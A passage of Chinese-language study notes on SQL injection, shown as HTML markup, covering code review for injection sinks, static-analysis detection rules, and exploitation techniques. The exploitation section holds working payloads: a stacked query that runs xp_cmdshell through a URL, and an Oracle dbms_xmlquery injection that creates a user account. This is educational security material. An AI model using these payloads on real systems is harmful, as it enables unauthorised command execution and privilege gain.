&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;where [definition] like &#39;&#39;%&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@text&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%&#39;&#39;&#39;&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;execute&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;调用储存过程&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;execute&lt;/span&gt; grep_sp &lt;span class=&#34;token string&#34;&gt;&#39;sp_executesql&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;execute&lt;/span&gt; grep_sp &lt;span class=&#34;token string&#34;&gt;&#39;EXEC&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;列出SQL Server 2008数据库中所有的存储过程&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; name &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;procedures &lt;span class=&#34;token keyword&#34;&gt;ORDER&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;BY&lt;/span&gt; name &lt;span class=&#34;token keyword&#34;&gt;asc&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;脚本&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@name&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VARCHAR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;-- database name&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt; db_cursor &lt;span class=&#34;token keyword&#34;&gt;CURSOR&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FOR&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; name &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;procedures&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;OPEN&lt;/span&gt; db_cursor
&lt;span class=&#34;token keyword&#34;&gt;FETCH&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;NEXT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; db_cursor &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@name&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;WHILE&lt;/span&gt; @&lt;span class=&#34;token variable&#34;&gt;@FETCH_STATUS&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;BEGIN&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@name&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- uncomment the line below to print the source&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- sp_helptext &#39;&#39; + @name + &#39;&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;FETCH&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;NEXT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; db_cursor &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@name&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CLOSE&lt;/span&gt; db_cursor
&lt;span class=&#34;token keyword&#34;&gt;DEALLOCATE&lt;/span&gt; db_cursor&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;mysql获取储存过程&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;show&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;procedure&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;status&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#列出一系列储存过程&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;show&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;procedure&lt;/span&gt; sp_name&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#列出sp_name的源代码&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;自动复查源代码&#34;&gt;&lt;a href=&#34;#自动复查源代码&#34; class=&#34;headerlink&#34; title=&#34;自动复查源代码&#34;&gt;&lt;/a&gt;自动复查源代码&lt;/h3&gt;&lt;h4 id=&#34;Graudit&#34;&gt;&lt;a href=&#34;#Graudit&#34; class=&#34;headerlink&#34; title=&#34;Graudit&#34;&gt;&lt;/a&gt;Graudit&lt;/h4&gt;&lt;p&gt;下载： &lt;a href=&#34;http://www.justanotherhacker.com/projects/graudit/&#34;&gt;graudit (justanotherhacker.com)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;规则&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;pg_query\s&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\$&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
pg_exec\s&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\$&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
pg_send_query\s&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\$&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
pg_send_query_params\s&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\$&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
pg_query_params\s&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\$&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
pg_send_prepare\s&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\$&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
pg_prepare\s&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\$&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
pg_execute\s&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\$&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
pg_insert\s&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\$&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
pg_put_line\s&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\$&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
pg_select\s&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\$&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
pg_update\s&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\$&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;\&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;YASCA&#34;&gt;&lt;a href=&#34;#YASCA&#34; class=&#34;headerlink&#34; title=&#34;YASCA&#34;&gt;&lt;/a&gt;YASCA&lt;/h4&gt;&lt;h4 id=&#34;Pixy&#34;&gt;&lt;a href=&#34;#Pixy&#34; class=&#34;headerlink&#34; title=&#34;Pixy&#34;&gt;&lt;/a&gt;Pixy&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql_db_query &lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; injection configuration &lt;span class=&#34;token keyword&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;defined sink sinkType &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt;
mysql_db_query &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;AppCodeScan&#34;&gt;&lt;a href=&#34;#AppCodeScan&#34; class=&#34;headerlink&#34; title=&#34;AppCodeScan&#34;&gt;&lt;/a&gt;AppCodeScan&lt;/h4&gt;&lt;p&gt;.NET&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#Scanning for SQL injections&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SqlCommand&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;?&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;DbCommand&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;?&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;OleDbCommand&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;?&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SqlUtility&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;?&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;OdbcCommand&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;?&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;OleDbDataAdapter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;?&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SqlDataSource&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;?&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;OWASP-LAPSE-项目&#34;&gt;&lt;a href=&#34;#OWASP-LAPSE-项目&#34; class=&#34;headerlink&#34; title=&#34;OWASP LAPSE+项目&#34;&gt;&lt;/a&gt;OWASP LAPSE+项目&lt;/h4&gt;&lt;h4 id=&#34;Microsoft-SQL注入源代码分析器&#34;&gt;&lt;a href=&#34;#Microsoft-SQL注入源代码分析器&#34; class=&#34;headerlink&#34; title=&#34;Microsoft SQL注入源代码分析器&#34;&gt;&lt;/a&gt;Microsoft SQL注入源代码分析器&lt;/h4&gt;&lt;h4 id=&#34;CAT-NET&#34;&gt;&lt;a href=&#34;#CAT-NET&#34; class=&#34;headerlink&#34; title=&#34;CAT.NET&#34;&gt;&lt;/a&gt;CAT.NET&lt;/h4&gt;&lt;h4 id=&#34;RIPS——PHP脚本漏洞的静态源代码分析器&#34;&gt;&lt;a href=&#34;#RIPS——PHP脚本漏洞的静态源代码分析器&#34; class=&#34;headerlink&#34; title=&#34;RIPS——PHP脚本漏洞的静态源代码分析器&#34;&gt;&lt;/a&gt;RIPS——PHP脚本漏洞的静态源代码分析器&lt;/h4&gt;&lt;h4 id=&#34;CodePro-AnalytiX&#34;&gt;&lt;a href=&#34;#CodePro-AnalytiX&#34; class=&#34;headerlink&#34; title=&#34;CodePro AnalytiX&#34;&gt;&lt;/a&gt;CodePro AnalytiX&lt;/h4&gt;&lt;h4 id=&#34;Teachable-Static-Analysis-Workbench&#34;&gt;&lt;a href=&#34;#Teachable-Static-Analysis-Workbench&#34; class=&#34;headerlink&#34; title=&#34;Teachable Static Analysis Workbench&#34;&gt;&lt;/a&gt;Teachable Static Analysis Workbench&lt;/h4&gt;&lt;h4 id=&#34;商业源代码复查工具&#34;&gt;&lt;a href=&#34;#商业源代码复查工具&#34; class=&#34;headerlink&#34; title=&#34;商业源代码复查工具&#34;&gt;&lt;/a&gt;商业源代码复查工具&lt;/h4&gt;&lt;h4 id=&#34;Fortify源代码分析器&#34;&gt;&lt;a href=&#34;#Fortify源代码分析器&#34; class=&#34;headerlink&#34; title=&#34;Fortify源代码分析器&#34;&gt;&lt;/a&gt;Fortify源代码分析器&lt;/h4&gt;&lt;h4 id=&#34;Rational-AppScan-Source-Edition&#34;&gt;&lt;a href=&#34;#Rational-AppScan-Source-Edition&#34; class=&#34;headerlink&#34; title=&#34;Rational AppScan Source Edition&#34;&gt;&lt;/a&gt;Rational AppScan Source Edition&lt;/h4&gt;&lt;h4 id=&#34;CodeSecure&#34;&gt;&lt;a href=&#34;#CodeSecure&#34; class=&#34;headerlink&#34; title=&#34;CodeSecure&#34;&gt;&lt;/a&gt;CodeSecure&lt;/h4&gt;&lt;h4 id=&#34;Klocwork-Solo&#34;&gt;&lt;a href=&#34;#Klocwork-Solo&#34; class=&#34;headerlink&#34; title=&#34;Klocwork Solo&#34;&gt;&lt;/a&gt;Klocwork Solo&lt;/h4&gt;&lt;h2 id=&#34;利用SQL注入&#34;&gt;&lt;a href=&#34;#利用SQL注入&#34; class=&#34;headerlink&#34; title=&#34;利用SQL注入&#34;&gt;&lt;/a&gt;利用SQL注入&lt;/h2&gt;&lt;h3 id=&#34;常见的漏洞利用技术&#34;&gt;&lt;a href=&#34;#常见的漏洞利用技术&#34; class=&#34;headerlink&#34; title=&#34;常见的漏洞利用技术&#34;&gt;&lt;/a&gt;常见的漏洞利用技术&lt;/h3&gt;&lt;p&gt;本章大多用这个示例&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://sql/Less-2/?id=1&#34;&gt;http://sql/Less-2/?id=1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/dd9f49a480d63d71849c61af3a1bb103.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;使用堆叠注入&#34;&gt;&lt;a href=&#34;#使用堆叠注入&#34; class=&#34;headerlink&#34; title=&#34;使用堆叠注入&#34;&gt;&lt;/a&gt;使用堆叠注入&lt;/h4&gt;&lt;p&gt;堆叠查询（stacked query）指的是在单个数据库连接中执行多个查询序列，使用不同的数据库和不同的web框架，对堆叠查询支持情况也不同，使用ASP.NET和PHP访问Microsoft SQL Server时允许堆叠查询，但如果使用Java来访问，就不允许。使用PHP访问PostgreSQL时， PHP允许堆叠查询，但如果访问MySQL, PHP不允许堆叠查询。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/products.asp=id=l;exec+master..xp_cmdshell+&#39;dir&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;在Web应用程序中利用Oracle漏洞&#34;&gt;&lt;a href=&#34;#在Web应用程序中利用Oracle漏洞&#34; class=&#34;headerlink&#34; title=&#34;在Web应用程序中利用Oracle漏洞&#34;&gt;&lt;/a&gt;在Web应用程序中利用Oracle漏洞&lt;/h4&gt;&lt;p&gt;Oracle SQL语法不支持堆叠查询，PL/SQL是内置在Oracle中的，它拓展了SQL并允许执行堆叠的命令，使用一个匿名PL/SQL块，它包含在一条BEGIN语句与一条END语句之间，是一个自由编写的PL/SQL块。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt;
MESG VARCHAR2 &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;BEGIN&lt;/span&gt;
MESG:&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;HELLO WORLD&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
DBMS_OUTPUT&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;PUT_LINE&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;MESG&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Oracle默认安装了两个允许执行匿名PL/SQL块的函数&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dbms_xmlquery.newcontext()&lt;/code&gt; &lt;code&gt;dbms_xmlquery.getxml()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;public用户默认允许访问这两个函数，所以可以使用这两个函数来执行DML/DDL语句块，形成SQL注入&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/index.jsp?id=l and (select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUT0N0M0US_TRANSACTI0N; begin execute immediate &#39;&#39; create user pwned identified by pwn3d &#39;&#39;; commit; end;&#39;) from dual) is not null -- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

